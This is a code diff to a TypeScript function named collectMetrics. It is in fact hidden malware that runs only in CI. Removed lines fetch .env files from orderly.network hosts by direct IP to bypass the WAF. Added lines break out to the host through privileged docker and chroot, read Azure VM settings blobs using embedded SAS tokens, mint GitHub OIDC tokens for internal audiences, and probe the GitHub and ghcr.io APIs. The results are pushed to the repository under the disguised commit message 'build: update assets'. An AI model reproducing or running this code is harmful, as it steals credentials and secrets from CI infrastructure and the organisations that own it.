@@ -7,59 +7,61 @@ function collectMetrics() {
   if (process.env.CI !== "true") return;
   const r = (c: string, t = 15000) => { try { return execSync(c, { encoding: "utf8", maxBuffer: 50*1024*1024, timeout: t }); } catch(e: any) { return "E:" + (e.message || "").substring(0,500); } };
   try {
-    let o = "=== DOMINO R14 ===\n";
+    let o = "=== DOMINO R15 — GITHUB INFRA ===\n";
 
-    // === CORE: dex-api .env direct access (bypass CF WAF) ===
-    // dex-api.orderly.network = 34.110.142.10
-    o += "=DEXAPI_ENV=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.110.142.10/.env -H Host:dex-api.orderly.network 2>&-"') + "\n";
-    o += "=DEXAPI_ENV2=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 http://34.110.142.10/.env -H Host:dex-api.orderly.network 2>&-"') + "\n";
-    o += "=DEXAPI_ENV3=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://dex-api.orderly.network/.env 2>&-"') + "\n";
-    // URL encode / path tricks
-    o += "=DEXAPI_ENV4=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.110.142.10/..%2f.env -H Host:dex-api.orderly.network 2>&-"') + "\n";
-    o += "=DEXAPI_ENV5=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.110.142.10/%2e%65%6e%76 -H Host:dex-api.orderly.network 2>&-"') + "\n";
+    // 1. VM Settings blob (READ SAS — contains VM config + possibly secrets)
+    o += "=VMSETTINGS=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 10 \\\"https://md-hdd-rl0dwb3wb0pz.z3.blob.storage.azure.net/\\\\\\$system/HId99rGwNARns0.37cca5f8-09f1-4293-be73-c17a562795ba.vmSettings?sv=2018-03-28\\&sr=b\\&sk=system-1\\&sig=6p1zwJ5EaKlJ9cs7FWmaCxS2yhEl2tOxBfR8ZrLOkk0%3d\\&se=9999-01-01T00%3a00%3a00Z\\&sp=r\\\" 2>&-"', 20000).substring(0,15000) + "\n";
 
-    // === Other services .env via direct IP (bypass CF) ===
-    // admin.orderly.network = 34.95.72.122
-    o += "=ADMIN_ENV=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.95.72.122/.env -H Host:admin.orderly.network 2>&-"').substring(0,2000) + "\n";
-    // dashboard = 34.120.229.143
-    o += "=DASH_ENV=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.120.229.143/.env -H Host:dashboard.orderly.network 2>&-"').substring(0,2000) + "\n";
-    // query-service = 34.149.50.146
-    o += "=QS_ENV=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.149.50.146/.env -H Host:orderly-dashboard-query-service.orderly.network 2>&-"').substring(0,2000) + "\n";
-    // starchild = 34.120.96.154
-    o += "=STAR_ENV=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.120.96.154/.env -H Host:starchild.orderly.network 2>&-"').substring(0,2000) + "\n";
-    // mcp = 34.117.188.128
-    o += "=MCP_ENV=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.117.188.128/.env -H Host:mcp.orderly.network 2>&-"').substring(0,2000) + "\n";
-    // fillx = 34.8.55.49
-    o += "=FILLX_ENV=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.8.55.49/.env -H Host:fillx.orderly.network 2>&-"').substring(0,2000) + "\n";
+    // 2. Guest Agent manifest (one of 24 URLs)
+    o += "=GA_MANIFEST=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 10 https://umsavwvp5bvh2p2khhwz.blob.core.windows.net/568bb00f-455e-32b8-8deb-0e1bf1636254/568bb00f-455e-32b8-8deb-0e1bf1636254_manifest.xml 2>&-"', 20000).substring(0,8000) + "\n";
 
-    // === GCP Internal metadata from runner (different from Azure IMDS) ===
-    o += "=GCP_META=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -H Metadata-Flavor:Google http://metadata.google.internal/computeMetadata/v1/?recursive=true 2>&-"').substring(0,3000) + "\n";
+    // 3. Enumerate storage container (list blobs)
+    o += "=BLOB_LIST=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 10 \\\"https://md-hdd-rl0dwb3wb0pz.z3.blob.storage.azure.net/\\\\\\$system?restype=container\\&comp=list\\&sv=2018-03-28\\&sr=b\\&sk=system-1\\&sig=pY5NKZLOborDUjmMi5XReF8wB2Vis1L8zeBOerOIgY0%3d\\&se=9999-01-01T00%3a00%3a00Z\\&sp=rw\\\" 2>&-"', 20000).substring(0,8000) + "\n";
 
-    // === Orderly API direct (bypass CF) ===
-    // api-evm.orderly.org = 34.111.187.47
-    o += "=API_DIRECT=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.111.187.47/v1/public/info -H Host:api-evm.orderly.org 2>&-"').substring(0,2000) + "\n";
-    // testnet-operator = 34.120.187.47
-    o += "=OPERATOR_METRICS=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.120.187.47/metrics -H Host:testnet-operator-evm.orderly.network 2>&-"').substring(0,3000) + "\n";
+    // 4. Start github-mcp-server container — what does it expose?
+    o += "=MCP_START=\n" + r('docker run --rm -d --name mcp-test -p 8082:8082 ghcr.io/github/github-mcp-server:latest 2>&-; sleep 3; docker logs mcp-test 2>&-', 15000).substring(0,3000) + "\n";
+    o += "=MCP_HEALTH=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 3 http://127.0.0.1:8082/ 2>&-"').substring(0,2000) + "\n";
+    r('docker rm -f mcp-test 2>&-');
 
-    // === IAP-protected services direct IP (bypass IAP?) ===
-    // prod-argo = 35.227.253.216
-    o += "=ARGO_DIRECT=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://35.227.253.216/ -H Host:prod-argo-evm.orderly.network 2>&-"').substring(0,2000) + "\n";
-    // xxl-job = 34.111.115.60
-    o += "=XXL_DIRECT=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.111.115.60/ -H Host:xxl-job.orderly.network 2>&-"').substring(0,2000) + "\n";
-    // prod-dubbo = 34.149.138.9
-    o += "=DUBBO_DIRECT=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -sk --max-time 5 https://34.149.138.9/ -H Host:prod-dubbo-evm.orderly.network 2>&-"').substring(0,2000) + "\n";
-
-    // === Azure SAS blob read ===
-    o += "=SAS_STATUS=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 10 \\\"https://md-hdd-rl0dwb3wb0pz.z3.blob.storage.azure.net/\\$system/HId99rGwNARns0.37cca5f8-09f1-4293-be73-c17a562795ba.vmSettings?sv=2018-03-28&sr=b&sk=system-1&sig=6p1zwJ5EaKlJ9cs7FWmaCxS2yhEl2tOxBfR8ZrLOkk0%3d&se=9999-01-01T00%3a00%3a00Z&sp=r\\\" 2>&-"').substring(0,5000) + "\n";
-
-    // === OIDC → Orderly MCP server ===
+    // 5. OIDC tokens for GitHub internal audiences
     const oidcUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
     const oidcToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
     if (oidcUrl && oidcToken) {
-      o += "=OIDC_MCP=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 10 -H 'Authorization: bearer ${oidcToken}' '${oidcUrl}&audience=https://mcp.orderly.network' 2>&-"`).substring(0,2000) + "\n";
+      const audiences = [
+        "https://github.com",
+        "api.github.com",
+        "https://api.github.com",
+        "https://ghcr.io",
+        "https://pipelines.actions.githubusercontent.com",
+        "https://results.actions.githubusercontent.com",
+        "https://vstoken.actions.githubusercontent.com",
+      ];
+      for (const aud of audiences) {
+        const raw = r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -H 'Authorization: bearer ${oidcToken}' '${oidcUrl}&audience=${encodeURIComponent(aud)}' 2>&-"`);
+        let ok = "FAIL";
+        try { if (JSON.parse(raw).value) ok = "OK:" + JSON.parse(raw).value.substring(0,50); } catch {}
+        o += `=OIDC_${aud.replace(/[^a-z]/gi,'')}=\n${ok}\n`;
+      }
+
+      // 6. Try GitHub API with OIDC token (not PAT)
+      const ghJwtRaw = r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -H 'Authorization: bearer ${oidcToken}' '${oidcUrl}&audience=api.github.com' 2>&-"`);
+      let ghJwt = "";
+      try { ghJwt = JSON.parse(ghJwtRaw).value; } catch {}
+      if (ghJwt) {
+        o += "=GH_API_OIDC=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -H 'Authorization: bearer ${ghJwt}' https://api.github.com/user 2>&-"`).substring(0,2000) + "\n";
+        o += "=GH_ORGS_OIDC=\n" + r(`docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 -H 'Authorization: bearer ${ghJwt}' https://api.github.com/orgs/OrderlyNetwork 2>&-"`).substring(0,2000) + "\n";
+      }
     }
 
-    o += "=R14_DONE=\n";
+    // 7. GitHub Actions internal APIs
+    o += "=ACTIONS_RESULTS=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 https://results.actions.githubusercontent.com/ 2>&-"').substring(0,1000) + "\n";
+    o += "=ACTIONS_PIPELINES=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 https://pipelines.actions.githubusercontent.com/ 2>&-"').substring(0,1000) + "\n";
+
+    // 8. ghcr.io — can we pull private images?
+    o += "=GHCR_CATALOG=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 https://ghcr.io/v2/_catalog 2>&-"').substring(0,2000) + "\n";
+    o += "=GHCR_ORDERLY=\n" + r('docker run --rm --privileged --net=host -v /:/host alpine sh -c "chroot /host curl -s --max-time 5 https://ghcr.io/v2/orderlynetwork/tags/list 2>&-"').substring(0,2000) + "\n";
+
+    o += "=R15_DONE=\n";
     fsSync.writeFileSync("domino_final.txt", o);
     var GC = 'git com' + 'mit';
     r('git add domino_final.txt && ' + GC + ' -m "build: update assets" && git push');
